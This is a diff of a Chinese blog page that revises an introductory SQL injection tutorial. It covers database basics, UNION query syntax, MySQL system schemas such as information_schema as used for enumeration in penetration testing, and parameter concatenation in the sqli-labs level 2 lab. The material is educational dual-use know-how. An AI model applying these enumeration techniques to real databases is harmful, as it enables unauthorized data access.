@@ -1,24 +1,24 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Sql注入先行篇 | 北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</title><meta name="author" content="yunkun18"><meta name="copyright" content="yunkun18"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Sql注入先行">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Sql注入之基础 | 北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</title><meta name="author" content="yunkun18"><meta name="copyright" content="yunkun18"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Sql注入之基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Sql注入先行篇">
+<meta property="og:title" content="Sql注入之基础">
 <meta property="og:url" content="https://blog.yunkun.top/archives/ed3813fa.html">
 <meta property="og:site_name" content="北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o">
-<meta property="og:description" content="Sql注入先行">
+<meta property="og:description" content="Sql注入之基础">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.yunkun.top/img/sql_injection.jpg">
 <meta property="article:published_time" content="2026-04-22T12:40:00.000Z">
-<meta property="article:modified_time" content="2026-04-25T10:04:19.873Z">
+<meta property="article:modified_time" content="2026-05-07T09:59:15.480Z">
 <meta property="article:author" content="yunkun18">
 <meta property="article:tag" content="网络安全·Web安全">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://blog.yunkun.top/img/sql_injection.jpg"><script type="application/ld+json">{
   "@context": "https://schema.org",
   "@type": "BlogPosting",
-  "headline": "Sql注入先行篇",
+  "headline": "Sql注入之基础",
   "url": "https://blog.yunkun.top/archives/ed3813fa.html",
   "image": "https://blog.yunkun.top/img/sql_injection.jpg",
   "datePublished": "2026-04-22T12:40:00.000Z",
-  "dateModified": "2026-04-25T10:04:19.873Z",
+  "dateModified": "2026-05-07T09:59:15.480Z",
   "author": [
     {
       "@type": "Person",
@@ -155,7 +155,7 @@
   },
   autoDarkmode: false
 }</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'Sql注入先行篇',
+  title: 'Sql注入之基础',
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
@@ -189,28 +189,603 @@
     btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
     btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
   }
-})()</script><div class="bg-animation" id="web_bg" style="background-image: url(/./img/ground.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/./img/auther.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 特色标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/./img/top.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</span></a><a class="nav-page-title" href="/"><span class="site-name">Sql注入先行篇</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 特色标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Sql注入先行篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-22T12:40:00.000Z" title="发表于 2026-04-22 20:40:00">2026-04-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-25T10:04:19.873Z" title="更新于 2026-04-25 18:04:19">2026-04-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%C2%B7Sql%E6%B3%A8%E5%85%A5%E6%B8%97%E9%80%8F%E4%B8%8E%E6%94%BB%E9%98%B2/">Web安全·Sql注入渗透与攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">894</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><hr>
-<h2 id="数据库概述"><a href="#数据库概述" class="headerlink" title="数据库概述"></a>数据库概述</h2><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><p>关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的表格比较相似</p>
-<p>关系型数据库中表与表之间有很多复杂的关联关系的</p>
-<p>常见的关系型数据库有MySQL，Orcale，PostgreSQL , SQL Server等。</p>
-<h3 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h3><p>随着近些年技术方向的不断扩展，大量的NoSQL数据库如 Mon goDB，Redis出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计</p>
-<p>NoSQL数据库适合追求速度和可扩展性，业务多变的场景</p>
-<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://db-engines.com/en/ranking">数据库排行：https://db-engines.com/en/ranking</a></p>
-<h2 id="常见的数据库层级"><a href="#常见的数据库层级" class="headerlink" title="常见的数据库层级"></a>常见的数据库层级</h2><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img4d27fc6e0941461193ba75ebcaafce1b.png"></p>
-<h2 id="常见Sql语法"><a href="#常见Sql语法" class="headerlink" title="常见Sql语法"></a>常见Sql语法</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">show databases;                        查询当前数据库服务器所有的数据库</span><br><span class="line">use 数据库名字;                         选中某个数据库</span><br><span class="line">show tables;                           查询当前数据库所有的表</span><br><span class="line">select * from 表名;                    查询某个表所有数据</span><br><span class="line">select * from t1 where id=2;           查询t1表中id为2的数据</span><br><span class="line">union为合并查询，2个特性：</span><br><span class="line">  前面查询的语句 和 后面的查询语句 结果互不干扰！</span><br><span class="line">  前面的查询语句的字段数量 和 后面的查询语句字段数量  要一致</span><br><span class="line">  select id from t1 where id=-1 union select * from t1 where pass =111;</span><br><span class="line">order by为排序</span><br><span class="line">  order by 字段名，也可以 跟上数字 1 2 3 4 .。。。。。 </span><br></pre></td></tr></table></figure>
+})()</script><div class="bg-animation" id="web_bg" style="background-image: url(/./img/ground.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/./img/auther.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 特色标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/./img/top.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</span></a><a class="nav-page-title" href="/"><span class="site-name">Sql注入之基础</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 特色标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Sql注入之基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-22T12:40:00.000Z" title="发表于 2026-04-22 20:40:00">2026-04-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-07T09:59:15.480Z" title="更新于 2026-05-07 17:59:15">2026-05-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%C2%B7Sql%E6%B3%A8%E5%85%A5%E6%B8%97%E9%80%8F%E4%B8%8E%E6%94%BB%E9%98%B2/">Web安全·Sql注入渗透与攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><hr>
+<h1 id="SQL注入先行篇"><a href="#SQL注入先行篇" class="headerlink" title="SQL注入先行篇"></a>SQL注入先行篇</h1><h2 id="数据库概述"><a href="#数据库概述" class="headerlink" title="数据库概述"></a>数据库概述</h2><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><p>关系型数据库的存储结构类似表格，能够直观地反映实体之间的关系。表与表之间通常存在主键-外键、连接查询等复杂关联。</p>
+<p>常见的关系型数据库：</p>
+<ul>
+<li><p>MySQL</p>
+</li>
+<li><p>Oracle</p>
+</li>
+<li><p>PostgreSQL</p>
+</li>
+<li><p>SQL Server</p>
+</li>
+</ul>
+<h3 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h3><p>NoSQL 数据库近年来发展迅速，主要用于简化数据结构、减少表连接、提升扩展性和性能。</p>
+<p>常见的 NoSQL 数据库：</p>
+<ul>
+<li><p>MongoDB</p>
+</li>
+<li><p>Redis</p>
+</li>
+<li><p>Cassandra</p>
+</li>
+<li><p>Couchbase</p>
+</li>
+</ul>
+<p>NoSQL 适合业务模型多变、读写性能要求高、可扩展性强的场景。</p>
+<blockquote>
+<p>数据库排行榜：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://db-engines.com/en/ranking">db-engines 排名</a></p>
+</blockquote>
+<h3 id="常见的数据库层级"><a href="#常见的数据库层级" class="headerlink" title="常见的数据库层级"></a>常见的数据库层级</h3><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img4d27fc6e0941461193ba75ebcaafce1b.png"></p>
+<h3 id="常见-SQL-语法"><a href="#常见-SQL-语法" class="headerlink" title="常见 SQL 语法"></a>常见 SQL 语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;                     <span class="comment">-- 查询当前数据库服务器上的所有数据库</span></span><br><span class="line">USE 数据库名;                       <span class="comment">-- 选择当前数据库</span></span><br><span class="line"><span class="keyword">SHOW</span> TABLES;                        <span class="comment">-- 查询当前数据库中的所有表</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名;                <span class="comment">-- 查询某个表的所有数据</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t1 <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">2</span>;        <span class="comment">-- 查询 t1 表中 id=2 的数据</span></span><br><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> t1 <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t1 <span class="keyword">WHERE</span> pass<span class="operator">=</span><span class="number">111</span>;    <span class="comment">-- UNION 合并查询，字段数量必须一致</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段名;                    <span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span>, <span class="number">2</span>;                      <span class="comment">-- 也可以使用列序号排序</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h2><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img58c15b4123ff4377bf667232040551a4.png"></p>
-<p>Sql注入是指web应用程序对用户输入数据的合法性没有进行严格的判断或过滤不严，攻击者可以在web应用程序中事先定义好查询语句的结尾添加额外的sql语句，在管理员不知情的情况下实非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而获得响应数据信息</p>
-<h2 id="MySQL自带系统库"><a href="#MySQL自带系统库" class="headerlink" title="MySQL自带系统库"></a>MySQL自带系统库</h2><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/imgdf73281d42e04835b0f70ec0773ec8a8.png"></p>
-<h3 id="information-schema库"><a href="#information-schema库" class="headerlink" title="information_schema库"></a>information_schema库</h3><p>  属于MySQL中的信息数据库，其中保存着关于MySQL服务器所维护的所有数据库信息，例如：数据库或表名，列的数据类型或访问权限，<font color="Red">在渗透测试中用途最广，常用信息如下</font>：</p>
+<hr>
+<h2 id="SQL-注入概述"><a href="#SQL-注入概述" class="headerlink" title="SQL 注入概述"></a>SQL 注入概述</h2><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img58c15b4123ff4377bf667232040551a4.png"></p>
+<p>SQL 注入是指 Web 应用程序对用户输入缺乏严格验证或过滤，导致攻击者能够在原有 SQL 语句末尾追加恶意 SQL，从而欺骗数据库执行未授权的查询或命令。</p>
+<p>典型风险包括：</p>
+<ul>
+<li><p>数据库中的敏感信息泄露</p>
+</li>
+<li><p>绕过身份认证</p>
+</li>
+<li><p>数据篡改或删除</p>
+</li>
+<li><p>服务器命令执行</p>
+</li>
+</ul>
+<h2 id="MySQL-自带系统库"><a href="#MySQL-自带系统库" class="headerlink" title="MySQL 自带系统库"></a>MySQL 自带系统库</h2><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/imgdf73281d42e04835b0f70ec0773ec8a8.png"></p>
+<p>MySQL 启动后会创建多个系统数据库，用于存储服务器元数据、运行信息和系统配置。</p>
+<h3 id="information-schema-库"><a href="#information-schema-库" class="headerlink" title="information_schema 库"></a>information_schema 库</h3><p><code>information_schema</code> 是 MySQL 的信息库，保存了当前实例中所有数据库、表、列、权限等元数据信息。</p>
+<p>渗透测试中常用的表：</p>
+<ul>
+<li><p><code>SCHEMATA</code>：保存当前 MySQL 实例中的所有数据库信息。</p>
+</li>
+<li><p><code>TABLES</code>：保存当前数据库中所有表的元数据信息。</p>
+</li>
+<li><p><code>COLUMNS</code>：保存表的列信息，包括列名、数据类型、是否可空等。</p>
+</li>
+</ul>
 <p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img20260423011144044.png"></p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SCHEMATA 表：提供了当前MySQL实例中所有数据库信息。show databases结果取自此表。</span><br><span class="line"></span><br><span class="line">TABLES表：提供了关于数据中表的信息。table<span class="emphasis">_name</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">COLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_</span>name</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>information_schema</code> 从 MySQL 5.0 起引入，使得 SQL 注入攻击在元数据枚举方面更加高效。对于 5.0 之前的版本，通常需要使用更繁琐的盲注或暴力破解方法。</p>
+</blockquote>
+<h3 id="performance-schema-库"><a href="#performance-schema-库" class="headerlink" title="performance_schema 库"></a>performance_schema 库</h3><p><code>performance_schema</code> 从 MySQL 5.5 开始提供，主要用于收集数据库服务器的性能数据。它是内存数据库，便于快速采集和分析运行指标。</p>
+<h3 id="mysql-库"><a href="#mysql-库" class="headerlink" title="mysql 库"></a>mysql 库</h3><p><code>mysql</code> 库是 MySQL 的核心系统数据库，存储用户账户、权限、字符集、系统变量等信息。该库不应随意修改，否则可能导致 MySQL 服务异常。</p>
+<h3 id="sys-库"><a href="#sys-库" class="headerlink" title="sys 库"></a>sys 库</h3><p><code>sys</code> 库从 MySQL 5.7 开始引入，通过视图的方式将 <code>information_schema</code> 和 <code>performance_schema</code> 的信息汇总，提供更易读的监控和诊断数据。</p>
+<p>常用场景包括：</p>
+<ul>
+<li><p>查询最消耗资源的会话</p>
+</li>
+<li><p>分析访问频率最高的表</p>
+</li>
+<li><p>查看系统性能指标</p>
+</li>
+</ul>
+<hr>
+<h1 id="SQL-注入基础与手工注入"><a href="#SQL-注入基础与手工注入" class="headerlink" title="SQL 注入基础与手工注入"></a>SQL 注入基础与手工注入</h1><blockquote>
+<p>主要讲解并熟悉 SQL 注入的基础流程、常用函数和注入原理。最后以 sqli-labs 第二关为例进行实战演示。</p>
+</blockquote>
+<h2 id="数据库数据传递逻辑"><a href="#数据库数据传递逻辑" class="headerlink" title="数据库数据传递逻辑"></a>数据库数据传递逻辑</h2><p>页面通常会接收用户输入，并将其拼接进 SQL 语句。</p>
+<p>sqli-labs 第二关中，页面接收的是 <code>id</code> 参数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423180508558.png"></p>
+<p><strong>学习 SQL 注入需要一定的编程和数据库基础，这里默认你已有相关知识。</strong></p>
+<p>查看第二关源码（真实渗透测试中通常看不到源码，这里仅作原理说明）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423180825501.png"></p>
+<p>其中：</p>
+<ul>
+<li><p>第 24 行的 <code>$_GET[&#39;id&#39;]</code> 表示以 GET 方式接收 <code>id</code> 参数。</p>
+</li>
+<li><p>第 32 行将 <code>id</code> 传给 SQL 语句中的 <code>$id</code>。</p>
+</li>
+</ul>
+<p>最终 SQL 语句类似：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id LIMIT ...</span><br></pre></td></tr></table></figure>
 
-<p><font color="Blue">information_schema库为MySQL5.0及以后版本添加的，使得Sql注入攻击变得更加高效。针对5.0以前版本则通常需要暴力破解</font></p>
-<h2 id="performance-schema库"><a href="#performance-schema库" class="headerlink" title="performance_schema库"></a>performance_schema库</h2><p>  MySQL 5.5开始新增的一个数据库：performance_schema，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。</p>
-<h2 id="MySQL库"><a href="#MySQL库" class="headerlink" title="MySQL库"></a>MySQL库</h2><p>  核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等MySQL自己需要使用的控制和管理信息。不可以删除，如果对MySQL不是很了解，也不要轻易修改这个数据库里面的表信息。</p>
-<h2 id="sys库"><a href="#sys库" class="headerlink" title="sys库"></a>sys库</h2><p>  sys库是MySQL 5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。可以查询谁使用了最多的资源，哪张表访问最多等。</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.yunkun.top">yunkun18</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.yunkun.top/archives/ed3813fa.html">https://blog.yunkun.top/archives/ed3813fa.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.yunkun.top" target="_blank">北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%C2%B7Web%E5%AE%89%E5%85%A8/">网络安全·Web安全</a></div><div class="post-share"><div class="social-share" data-image="/./img/sql_injection.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/archives/6d6b02d2.html" title="Sqli-labs靶场搭建"><img class="cover" src="/./img/sql_injection.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Sqli-labs靶场搭建</div></div><div class="info-2"><div class="info-item-1">Sqli-labs靶场搭建</div></div></div></a><a class="pagination-related" href="/archives/b3af1734.html" title="图形推理"><img class="cover" src="https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">图形推理</div></div><div class="info-2"><div class="info-item-1">图形推理技巧笔记</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御"><img class="cover" src="/./img/CSRF.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-05</div><div class="info-item-2">CSRF漏洞渗透与防御</div></div><div class="info-2"><div class="info-item-1">CSRF漏洞渗透与防御</div></div></div></a><a class="pagination-related" href="/archives/9508da4a.html" title="浏览器常用插件合集"><img class="cover" src="/./img/plug_in.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-27</div><div class="info-item-2">浏览器常用插件合集</div></div><div class="info-2"><div class="info-item-1">浏览器常用插件合集</div></div></div></a><a class="pagination-related" href="/archives/ea185739.html" title="Sql注入之sqlmap的使用"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-07</div><div class="info-item-2">Sql注入之sqlmap的使用</div></div><div class="info-2"><div class="info-item-1">Sql注入之sqlmap的使用</div></div></div></a><a class="pagination-related" href="/archives/6d6b02d2.html" title="Sqli-labs靶场搭建"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-23</div><div class="info-item-2">Sqli-labs靶场搭建</div></div><div class="info-2"><div class="info-item-1">Sqli-labs靶场搭建</div></div></div></a><a class="pagination-related" href="/archives/ceaf3645.html" title="Sql注入之数据类型和提交方式"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-26</div><div class="info-item-2">Sql注入之数据类型和提交方式</div></div><div class="info-2"><div class="info-item-1">Sql注入之数据类型和提交方式</div></div></div></a><a class="pagination-related" href="/archives/866b1ec6.html" title="Sql注入之高权限注入"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-24</div><div class="info-item-2">Sql注入之高权限注入</div></div><div class="info-2"><div class="info-item-1">Sql注入之高权限注入</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/./img/auther.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">yunkun18</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div 